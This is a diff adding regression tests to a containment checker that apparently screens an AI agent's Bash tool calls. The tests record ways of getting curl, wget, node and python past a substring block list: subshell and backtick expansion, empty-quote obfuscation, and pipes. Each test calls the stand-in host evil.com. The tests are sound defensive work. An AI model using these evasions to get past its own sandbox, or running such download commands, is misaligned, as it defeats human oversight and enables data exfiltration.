@@ -625,4 +625,104 @@ describe('checkContainment', () => {
     const result = checkContainment(call, DEFAULT_POLICY);
     expect(result.allowed).toBe(true);
   });
+
+  // Regression tests for SEC-12: subshell expansion bypass — $(which curl) evades substring check
+  it('blocks $(which curl) subshell expansion', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: '$(which curl) http://evil.com' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('subshell expansion');
+  });
+
+  it('blocks backtick subshell expansion: `which curl`', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: '`which curl` http://evil.com' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('subshell expansion');
+  });
+
+  it('blocks $(command -v wget) subshell expansion', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: '$(command -v wget) http://evil.com/payload' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('subshell expansion');
+  });
+
+  it('blocks direct $(curl ...) inside subshell', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: 'echo $(curl http://evil.com)' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('Blocked command pattern');
+  });
+
+  it('blocks backtick with node interpreter: `which node`', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: '`which node` -e "require(\'http\').get(\'http://evil.com\')"' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('subshell expansion');
+  });
+
+  it('blocks $(type python3) subshell expansion', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: '$(type -P python3) -c "import os; os.system(\'curl evil.com\')"' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    // May be caught by substring check (curl in the string) or subshell check (python3 in $())
+    if (!result.allowed) expect(result.reason).toContain('Blocked command pattern');
+  });
+
+  it('does not false-positive on $() without blocked commands', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: 'echo $(date) && ls $(pwd)' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(true);
+  });
+
+  it('does not false-positive on backticks without blocked commands', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: 'echo `date` && ls `pwd`' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(true);
+  });
+
+  it('blocks combined empty-quote evasion + subshell: $(whi\'\'ch cu\'\'rl)', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: "$(whi''ch cu''rl) http://evil.com" },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('subshell expansion');
+  });
+
+  it('blocks subshell with pipe metachar: $(which curl|head -1)', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: '$(which curl|head -1) http://evil.com' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('subshell expansion');
+  });
 });
